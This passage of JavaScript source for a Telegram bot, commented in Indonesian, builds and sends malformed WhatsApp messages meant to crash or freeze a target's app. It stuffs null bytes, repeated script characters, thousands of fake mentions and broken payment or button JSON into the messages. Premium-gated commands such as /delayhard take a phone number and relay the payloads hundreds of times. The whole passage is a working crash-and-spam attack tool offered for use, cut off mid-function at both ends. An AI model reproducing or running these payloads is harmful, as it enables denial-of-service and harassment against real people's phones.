    messageId: msg.key.id
    });
}

// bebas bug sender maupun target 
// bisa untuk function bug group 
async function crashXh(sock, target) {
    const MakLo = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "MakLo",
                                rows: "\0",
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "CRB"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, MakLo, {});

    await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
    });
}

async function QQSPrivateBlank(sock, target) {
  const QQS = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '˚₊·— ͟͞͞♡𝙌𝙌𝙎 제 𝙊𝙢𝙝𝙘𝙎𝙞𝙡𝙚𝙣𝙘𝙚' + QQS + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "bokep.com",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, message, { participant: { jid: target } });

  let baten = [];
  const buttonss = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 10; i++) {
    baten.push(
 { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
 { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const stxview = {
    viewOnceMessage: {
 message: {
   interactiveMessage: {
 contextInfo: {
   participant: target,
  mentionedJid: [
    "0@s.whatsapp.net",
    ...Array.from(
 { length: 1900 },
 () =>
   "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    ),
  ],
   remoteJid: "X",
   participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
   stanzaId: "123",
   quotedMessage: {
 paymentInviteMessage: {
   serviceType: 3,
   expiryTimestamp: Date.now() + 1814400000
 },
 forwardedAiBotMessageInfo: {
   botName: "META AI",
   botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
   creatorName: "Bot"
 }
 }
    },
     carouselMessage: {
  messageVersion: 1,
  cards: [
    {
 header: {
   hasMediaAttachment: true,
   imageMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "9999999999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
  },
 },
 body: { text: "Cuh" + "\u0000".repeat(5000) },
 nativeFlowMessage: {
   buttons: baten,
   messageParamsJson: "{".repeat(10000)
 }
    }
  ]
     }
   }
 }
    }
  };
  
    await sock.relayMessage(target, stxview, {
 messageId: null,
 participant: { jid: target },
 userJid: target
    }),
    await sock.relayMessage(target, stxview, {
 messageId: null,
 participant: { jid: target },
 userJid: target
    });

  console.log(chalk.red(` Successfully Sending to Number: ${target} `));

  const Payload = "\u0000".repeat(20000);

  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName:
              "ꦽ".repeat(12000) +
              "ꦾ".repeat(12000),
            jpegThumbnail: null,
            caption:
              "˚₊·— ͟͞͞♡𝙌𝙌𝙎 제 𝙊𝙢𝙝𝙘𝙎𝙞𝙡𝙚𝙣𝙘𝙚?" +
              "ꦾ".repeat(12000) +
              "ꦽ".repeat(12000),
            inviteExpiration: Date.now() + 9999999999,

            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "ChocoMilk",
                    description: "Vevekjanda..",
                  }),
                },
                {
                  name: "order_payment",
                  buttonParamsJson: JSON.stringify({
                    order_id: "ORDER_" + Math.floor(Math.random() * 999999),
                    amount: "9999999",
                    currency: "IDR",
                    note: "Janda" + Payload,
                  }),
                },
                {
                  name: "view_product",
                  buttonParamsJson: Payload,
                },
                {
                  name: "address_message",
                  buttonParamsJson: Payload,
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: Payload,
                },
                {
                  name: "cta_url",
                  buttonParamsJson: Payload,
                  url: "https://wa.me/stickerPack/suki",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: Payload,
                },
              ],
              messageParamsJson: "\n".repeat(1000),
            },
          },

          contextInfo: {
            remoteJid: target,
            participant: target,
            stanzaId: sock.generateMessageTag?.(),
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      userJid: target,
    });

    const message1 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            header: {
              hasMediaAttachment: true,
              locationMessage: {
                degreesLatitude: -6.9992,
                degreesLongitude: 106.81996666,
                name: "",
                address: "\u0007".repeat(2000),
                jpegThumbnail: Buffer.alloc(0),
              },
            },
            body: {
              text: "ꦽ".repeat(2000),
            },
            footer: {
              text: "ꦾ".repeat(10000),
            },

            nativeFlowResponseMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null,
                  }),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null,
                  }),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    url:
                      "https://files.catbox.moe/02bkvo.jpg" +
                      "𑜦𑜠".repeat(10000) +
                      ".com",
                  }),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    copy_code: "𑜦𑜠".repeat(10000),
                  }),
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "PROMOTION",
                    flow_cta: "haay",
                    flow_message_version: "3",
                  }),
                },
                {
                  name: "payment_method",
                  buttonParamsJson:
                    "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"const = LuciferXiter\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"const = LuciferXiter\",\"native_payment_methods\":[],\"share_payment_status\":false}",
                },
              ],
              messageParamsJson: JSON.stringify({ meta: "sharelocation" }),
            },
          },
        },
      },
    };

    const msg = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 1900 },
            (_, y) => `9${y + 1}@s.whatsapp.net`
          ),
        },
        body: {
          text: "",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`,
          version: 3,
        },
      },
    };

    await sock.relayMessage(
      "status@broadcast",
      message1,
      msg,
      {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      }
    );
  } catch (error) {
    console.log("Error in: " + error);
  }
}

async function ZynosBlankNew(sock, target) {
    const jid = target.includes("@") ? target : target + "@s.whatsapp.net";

    const payload = {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ZynosBlankHard" + "҉⃝".repeat(60000),
            publisher: "ZynosOffcial",
            stickers: [
                { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "Jawa Jawa", isLottie: false, mimetype: "image/webp" },
                { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" }
            ],
            fileLength: "3662919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "0@s.whatsapp.net",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: [
                    "6285215587498@s.whatsapp.net",
                    ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
                ]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 252,
            thumbnailWidth: 252,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "3680054",
            stickerPackOrigin: "USER_CREATED"
        }
    };

    await sock.relayMessage(jid, payload, { participant: { jid: jid } });

    console.log(`✅ Bugs Sent To ${jid}`);
}

async function LexzyModssV7(sock, target) {
    const usr = "0@s.whatsapp.net";
    const x = "{}";

    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "LexzyModss - Executed ",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => 
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        )
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: false,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `LexzyModss - Executed`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    }

    const interactiveResponMessage = {
        contextInfo: {
            forwardingScore: null,
            isForwarded: false,
            fromMe: true,
            participant: "0@s.whatsapp.net",
            mentionJid: usr,
        },
        body: {
            text: x,
            format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
            name: "LexzyModss - Executed¿!",
            paramsJson: x,
            version: 3
        }
    };
    await sock.relayMessage(target, { interactiveResponMessage }, { participant: { jid: target } });

    const view0nceMessageV2 = {
        message: {
            interactiveMessage: {
                locationMessage: {
                    degreesLatitude: 9999999999,
                    degreesLongitude: 9999999999,
                },
                body: {
                    text: "LexzyModss - Executed¿!",
                },
                nativeFlowMessage: {
                    buttons: "\u0000".repeat(10000),
                },
            },
        },
    };
    await sock.relayMessage(target, { viewOnceMessageV2: view0nceMessageV2 }, { participant: { jid: target } });

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "NandoJatuhCinta",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 20000 }, () => ({}))
                    },
                },
            },
        },
    }, { participant: { jid: target } });
    
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "LexzyModss - Executed¿!",
                        format: "DEFAULT",
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: `{\"values\":{\"in_pin_code\":\"+99999999999\",\"building_name\":\"ampos\",\"address\":\"/NanasMuda\",\"tower_number\":\"987\",\"city\":\"NanasMuda\",\"name\":\"NanasExecuted\",\"phone_number\":\"+888888888888\",\"house_number\":\"99\",\"floor_number\":\"99\",\"state\":\"${"\u0000".repeat(75000)}\"}}`,
                        version: 3
                    },
                    contextInfo: {
                        remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
                        isForwarded: true,
                        forwardingScore: 999,
                        urlTrackingMap: {
                            urlTrackingMapElements: Array.from({ length: 209000 }, (_, n) => ({
                                participant: `62${n + 8500000}@s.whatsapp.net`
                            }))
                        },
                    },
                },
            },
        },
    }, { participant: { jid: target } });
}

async function ZetTempurGb(sock, groupJid) {
const CrBLay = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Maklo¡!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        },
      },
    },
  };
  
 const Crb1 = generateWAMessageFromContent(groupJid, CrBLay, {});

await sock.relayMessage(groupJid, Crb1.message, {
messageId: Crb1.key.id
})

await sleep(200);

const CrBDoj = {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo¡!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        },
      },
    },
  };
  
const Crb2 = generateWAMessageFromContent(groupJid, CrBDoj, {});

await sock.relayMessage(groupJid, Crb2.message, {
messageId: Crb2.key.id
})

await sleep(200);

const CrBLol = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              },
            },
          },
        },
      },
    },
  };

const Crb3 = generateWAMessageFromContent(groupJid, CrBLol, {});

await sock.relayMessage(groupJid, Crb3.message, {
messageId: Crb3.key.id
})
}
//=======CASE BUG=========//

bot.onText(/\/delayspam (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendMessage(chatId, `❌ Kamu tidak memiliki akses premium!`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }

const sentMessage = await bot.sendMessage(chatId, `
\`\`\`
状态 : ⏳Sedang mengirim......
\`\`\`
`, { parse_mode: "Markdown" });

console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
for (let i = 0; i <= 1; i++) {   
  await LexcaabosV7(sock, target);
}

console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

await bot.editMessageText(`
\`\`\`
状态 : ✅ Succes send bug
\`\`\`
`, {
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "Markdown"
});

} catch (error) {
  bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/delayhard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendMessage(chatId, `❌ Kamu tidak memiliki akses premium!`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }

    const sentMessage = await bot.sendMessage(chatId, `
\`\`\`
状态 : ⏳Sedang mengirim......
\`\`\`
`, { parse_mode: "Markdown" });
    
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 100; i++) {   
      await LexzyModssV7(sock, target);
      await LexzyModssV7(sock, target);
      await LexzyModssV7(sock, target);
      await LexzyModssV7(sock, target);
      await LexzyModssV7(sock, target);
      await sleep(3500);
    }
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    await bot.editMessageText(`
\`\`\`
状态 : ✅ Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown"
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/blank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendMessage(chatId, `❌ Kamu tidak memiliki akses premium!`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }

    const sentMessage = await bot.sendMessage(chatId, `
\`\`\`
状态 : ⏳Sedang mengirim......
\`\`\`
`, { parse_mode: "Markdown" });
    
